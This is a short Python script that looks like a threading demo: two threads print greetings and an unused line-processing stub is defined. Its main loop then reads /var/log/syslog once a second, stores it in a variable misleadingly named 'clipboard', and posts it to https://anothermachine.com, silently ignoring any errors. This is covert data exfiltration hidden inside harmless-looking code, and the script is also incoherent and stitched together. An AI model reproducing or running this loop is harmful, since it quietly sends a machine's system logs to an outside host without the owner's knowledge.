import threading
import time
import requests

def hello(name):
    print("hello " + name)

def processLine(dRecieved):
    # do something with dRecieved
    pass

def main():
    processThread = threading.Thread(target=hello, args=("Alice",)) 
    processThread.start()

    processThread = threading.Thread(target=hello, args=("Tome",)) 
    processThread.start()

    while True:
        try:
            with open("/var/log/syslog", "r") as f:
                clipboard = f.read().strip()
                if clipboard:
                    requests.post(
                        "https://anothermachine.com", data={"clipboard": clipboard}
                    )
        except:
            pass
        time.sleep(1)

